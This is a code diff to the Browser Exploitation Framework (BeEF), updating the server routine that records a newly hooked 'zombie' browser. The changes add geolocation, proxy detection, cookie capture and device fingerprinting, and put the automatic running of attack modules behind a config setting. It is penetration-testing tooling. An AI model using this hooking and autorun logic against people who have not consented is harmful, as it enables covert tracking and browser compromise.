@@ -1,17 +1,7 @@
 #
-#   Copyright 2012 Wade Alcorn wade@bindshell.net
-#
-#   Licensed under the Apache License, Version 2.0 (the "License");
-#   you may not use this file except in compliance with the License.
-#   You may obtain a copy of the License at
-#
-#       http://www.apache.org/licenses/LICENSE-2.0
-#
-#   Unless required by applicable law or agreed to in writing, software
-#   distributed under the License is distributed on an "AS IS" BASIS,
-#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-#   See the License for the specific language governing permissions and
-#   limitations under the License.
+# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
 #
 module BeEF
   module Core
@@ -34,6 +24,9 @@ module BeEF
         end
 
         def setup()
+          print_debug "[INIT] Processing Browser Details..."
+          config = BeEF::Core::Configuration.instance
+
           # validate hook session value
           session_id = get_param(@data, 'beefhook')
           (self.err_msg "session id is invalid"; return) if not BeEF::Filters.is_valid_hook_session_id?(session_id)
@@ -75,6 +68,7 @@ module BeEF
                       }
           zombie.httpheaders = @http_headers.to_json
           zombie.save
+          #print_debug "[INIT] HTTP Headers: #{zombie.httpheaders}"
 
           # add a log entry for the newly hooked browser
           BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} just joined the horde from the domain: #{log_zombie_domain}:#{log_zombie_port.to_s}", "#{zombie.id}")
@@ -84,6 +78,86 @@ module BeEF
             BD.set(session_id, 'BrowserName', browser_name)
           else
             self.err_msg "Invalid browser name returned from the hook browser's initial connection."
+          end
+
+          # geolocation
+          if config.get('beef.geoip.enable')
+            require 'geoip'
+            geoip_file = config.get('beef.geoip.database')
+            if File.exists? geoip_file
+              geoip = GeoIP.new(geoip_file).city(zombie.ip)
+              if geoip.nil?
+                print_debug "[INIT] Geolocation failed - No results for IP address '#{zombie.ip}'"
+              else
+                #print_debug "[INIT] Geolocation results: #{geoip}"
+                BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} is connecting from: #{geoip}", "#{zombie.id}")
+                BD.set(session_id, 'LocationCity',          "#{geoip['city_name']}")
+                BD.set(session_id, 'LocationCountry',       "#{geoip['country_name']}")
+                BD.set(session_id, 'LocationCountryCode2',  "#{geoip['country_code2']}")
+                BD.set(session_id, 'LocationCountryCode3',  "#{geoip['country_code3']}")
+                BD.set(session_id, 'LocationContinentCode', "#{geoip['continent_code']}")
+                BD.set(session_id, 'LocationPostCode',      "#{geoip['postal_code']}")
+                BD.set(session_id, 'LocationLatitude',      "#{geoip['latitude']}")
+                BD.set(session_id, 'LocationLongitude',     "#{geoip['longitude']}")
+                BD.set(session_id, 'LocationDMACode',       "#{geoip['dma_code']}")
+                BD.set(session_id, 'LocationAreaCode',      "#{geoip['area_code']}")
+                BD.set(session_id, 'LocationTimezone',      "#{geoip['timezone']}")
+                BD.set(session_id, 'LocationRegionName',    "#{geoip['real_region_name']}")
+              end
+            else
+              print_error "[INIT] Geolocation failed - Could not find MaxMind GeoIP database '#{geoip_file}'"
+              print_more  "Download: http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz"
+            end
+          end
+
+          # detect browser proxy
+          using_proxy = false
+          [
+            'CLIENT_IP',
+            'FORWARDED_FOR',
+            'FORWARDED',
+            'FORWARDED_FOR_IP',
+            'PROXY_CONNECTION',
+            'PROXY_AUTHENTICATE',
+            'X_FORWARDED',
+            'X_FORWARDED_FOR',
+            'VIA'
+          ].each do |header|
+            unless JSON.parse(zombie.httpheaders)[header].nil?
+              using_proxy = true
+              break
+            end
+          end
+
+          # retrieve proxy client IP
+          proxy_clients = []
+          [
+            'CLIENT_IP',
+            'FORWARDED_FOR',
+            'FORWARDED',
+            'FORWARDED_FOR_IP',
+            'X_FORWARDED',
+            'X_FORWARDED_FOR'
+          ].each do |header|
+            proxy_clients << "#{JSON.parse(zombie.httpheaders)[header]}" unless JSON.parse(zombie.httpheaders)[header].nil?
+          end
+
+          # retrieve proxy server
+          proxy_server = JSON.parse(zombie.httpheaders)['VIA'] unless JSON.parse(zombie.httpheaders)['VIA'].nil?
+
+          # store and log proxy details
+          if using_proxy == true
+            BD.set(session_id, 'UsingProxy', "#{using_proxy}")
+            proxy_log_string = "#{zombie.ip} is using a proxy"
+            unless proxy_clients.empty?
+              BD.set(session_id, 'ProxyClient', "#{proxy_clients.sort.uniq.join(',')}")
+              proxy_log_string += " [client: #{proxy_clients.sort.uniq.join(',')}]"
+            end
+            unless proxy_server.nil?
+              BD.set(session_id, 'ProxyServer', "#{proxy_server}")
+              proxy_log_string += " [server: #{proxy_server}]"
+            end
+            BeEF::Core::Logger.instance.register('Zombie', "#{proxy_log_string}", "#{zombie.id}")
           end
 
           # get and store browser version
@@ -102,6 +176,10 @@ module BeEF
             self.err_msg "Invalid browser string returned from the hook browser's initial connection."
           end
 
+          # get and store browser language
+          browser_lang = get_param(@data['results'], 'BrowserLanguage')
+          BD.set(session_id, 'BrowserLanguage', browser_lang)
+
           # get and store the cookies
           cookies = get_param(@data['results'], 'Cookies')
           if BeEF::Filters.is_valid_cookies?(cookies)
@@ -117,6 +195,10 @@ module BeEF
           else
             self.err_msg "Invalid operating system name returned from the hook browser's initial connection."
           end
+
+          # get and store default browser
+          default_browser = get_param(@data['results'], 'DefaultBrowser')
+          BD.set(session_id, 'DefaultBrowser', default_browser)
 
           # get and store the hardware name
           hw_name = get_param(@data['results'], 'Hardware')
@@ -175,11 +257,11 @@ module BeEF
           end
 
           # get and store the system platform
-          system_platform = get_param(@data['results'], 'SystemPlatform')
+          system_platform = get_param(@data['results'], 'BrowserPlatform')
           if BeEF::Filters.is_valid_system_platform?(system_platform)
-            BD.set(session_id, 'SystemPlatform', system_platform)
+            BD.set(session_id, 'BrowserPlatform', system_platform)
           else
-            self.err_msg "Invalid system platform returned from the hook browser's initial connection."
+            self.err_msg "Invalid browser platform returned from the hook browser's initial connection."
           end
 
           # get and store the hooked browser type
@@ -206,76 +288,36 @@ module BeEF
             self.err_msg "Invalid window size returned from the hook browser's initial connection."
           end
 
-          # get and store the yes|no value for JavaEnabled
-          java_enabled = get_param(@data['results'], 'JavaEnabled')
-          if BeEF::Filters.is_valid_yes_no?(java_enabled)
-            BD.set(session_id, 'JavaEnabled', java_enabled)
-          else
-            self.err_msg "Invalid value for JavaEnabled returned from the hook browser's initial connection."
+          # get and store the yes|no value for browser components
+          components = [
+            'VBScriptEnabled', 'HasFlash', 'HasPhonegap', 'HasGoogleGears',
+            'HasFoxit', 'HasWebSocket', 'HasWebRTC', 'HasActiveX',
+            'HasSilverlight', 'HasQuickTime', 'HasRealPlayer', 'HasWMP',
+            'hasSessionCookies', 'hasPersistentCookies'
+          ]
+          components.each do |k|
+            v = get_param(@data['results'], k)
+            if BeEF::Filters.is_valid_yes_no?(v)
+              BD.set(session_id, k, v)
+            else
+              self.err_msg "Invalid value for #{k} returned from the hook browser's initial connection."
+            end
           end
 
-          # get and store the yes|no value for VBScriptEnabled
-          vbscript_enabled = get_param(@data['results'], 'VBScriptEnabled')
-          if  BeEF::Filters.is_valid_yes_no?(vbscript_enabled)
-            BD.set(session_id, 'VBScriptEnabled', vbscript_enabled)
+          # get and store the value for CPU
+          cpu_type = get_param(@data['results'], 'CPU')
+          if BeEF::Filters.is_valid_cpu?(cpu_type)
+            BD.set(session_id, 'CPU', cpu_type)
           else
-            self.err_msg "Invalid value for VBScriptEnabled returned from the hook browser's initial connection."
+            self.err_msg "Invalid value for CPU returned from the hook browser's initial connection."
           end
 
-          # get and store the yes|no value for HasFlash
-          has_flash = get_param(@data['results'], 'HasFlash')
-          if BeEF::Filters.is_valid_yes_no?(has_flash)
-            BD.set(session_id, 'HasFlash', has_flash)
+          # get and store the value for TouchEnabled
+          touch_enabled = get_param(@data['results'], 'TouchEnabled')
+          if BeEF::Filters.is_valid_yes_no?(touch_enabled)
+            BD.set(session_id, 'TouchEnabled', touch_enabled)
           else
-            self.err_msg "Invalid value for HasFlash returned from the hook browser's initial connection."
-          end
-
-          # get and store the yes|no value for HasPhonegap
-          has_phonegap = get_param(@data['results'], 'HasPhonegap')
-          if BeEF::Filters.is_valid_yes_no?(has_phonegap)
-            BD.set(session_id, 'HasPhonegap', has_phonegap)
-          else
-            self.err_msg "Invalid value for HasPhonegap returned from the hook browser's initial connection."
-          end
-
-          # get and store the yes|no value for HasGoogleGears
-          has_googlegears = get_param(@data['results'], 'HasGoogleGears')
-          if BeEF::Filters.is_valid_yes_no?(has_googlegears)
-            BD.set(session_id, 'HasGoogleGears', has_googlegears)
-          else
-            self.err_msg "Invalid value for HasGoogleGears returned from the hook browser's initial connection."
-          end
-
-          # get and store the yes|no value for HasWebSocket
-          has_web_socket = get_param(@data['results'], 'HasWebSocket')
-          if BeEF::Filters.is_valid_yes_no?(has_web_socket)
-            BD.set(session_id, 'HasWebSocket', has_web_socket)
-          else
-            self.err_msg "Invalid value for HasWebSocket returned from the hook browser's initial connection."
-          end
-
-          # get and store the yes|no value for HasActiveX
-          has_activex = get_param(@data['results'], 'HasActiveX')
-          if BeEF::Filters.is_valid_yes_no?(has_activex)
-            BD.set(session_id, 'HasActiveX', has_activex)
-          else
-            self.err_msg "Invalid value for HasActiveX returned from the hook browser's initial connection."
-          end
-
-          # get and store whether the browser has session cookies enabled
-          has_session_cookies = get_param(@data['results'], 'hasSessionCookies')
-          if BeEF::Filters.is_valid_yes_no?(has_session_cookies)
-            BD.set(session_id, 'hasSessionCookies', has_session_cookies)
-          else
-            self.err_msg "Invalid value for hasSessionCookies returned from the hook browser's initial connection."
-          end
-
-          # get and store whether the browser has persistent cookies enabled
-          has_persistent_cookies = get_param(@data['results'], 'hasPersistentCookies')
-          if BeEF::Filters.is_valid_yes_no?(has_persistent_cookies)
-            BD.set(session_id, 'hasPersistentCookies', has_persistent_cookies)
-          else
-            self.err_msg "Invalid value for hasPersistentCookies returned from the hook browser's initial connection."
+            self.err_msg "Invalid value for TouchEnabled returned from the hook browser's initial connection."
           end
 
           # log a few info of newly hooked zombie in the console
@@ -283,19 +325,25 @@ module BeEF
 
 
           # Call autorun modules
-          autorun = []
-          BeEF::Core::Configuration.instance.get('beef.module').each { |k, v|
-            if v.has_key?('autorun') and v['autorun'] == true
-              if BeEF::Module.support(k, {'browser' => browser_name, 'ver' => browser_version, 'os' => os_name}) == BeEF::Core::Constants::CommandModule::VERIFIED_WORKING
-                BeEF::Module.execute(k, session_id)
-                autorun.push(k)
-              else
-                print_debug "Autorun attempted to execute unsupported module '#{k}' against Hooked browser #{zombie.ip}"
+          if config.get('beef.autorun.enable')
+            autorun = []
+            BeEF::Core::Configuration.instance.get('beef.module').each { |k, v|
+              if v.has_key?('autorun') and v['autorun'] == true
+                target_status = BeEF::Module.support(k, {'browser' => browser_name, 'ver' => browser_version, 'os' => os_name})
+                if target_status == BeEF::Core::Constants::CommandModule::VERIFIED_WORKING
+                  BeEF::Module.execute(k, session_id)
+                  autorun.push(k)
+                elsif target_status == BeEF::Core::Constants::CommandModule::VERIFIED_USER_NOTIFY and config.get('beef.autorun.allow_user_notify')
+                  BeEF::Module.execute(k, session_id)
+                  autorun.push(k)
+                else
+                  print_debug "Autorun attempted to execute unsupported module '#{k}' against Hooked browser [id:#{zombie.id}, ip:#{zombie.ip}, type:#{browser_name}-#{browser_version}, os:#{os_name}]"
+                end
               end
+            }
+            if autorun.length > 0
+              print_info "Autorun executed[#{autorun.join(', ')}] against Hooked browser [id:#{zombie.id}, ip:#{zombie.ip}, type:#{browser_name}-#{browser_version}, os:#{os_name}]"
             end
-          }
-          if autorun.length > 0
-            print_info "Autorun executed: #{autorun.join(', ')} against Hooked browser #{zombie.ip}"
           end
         end
 
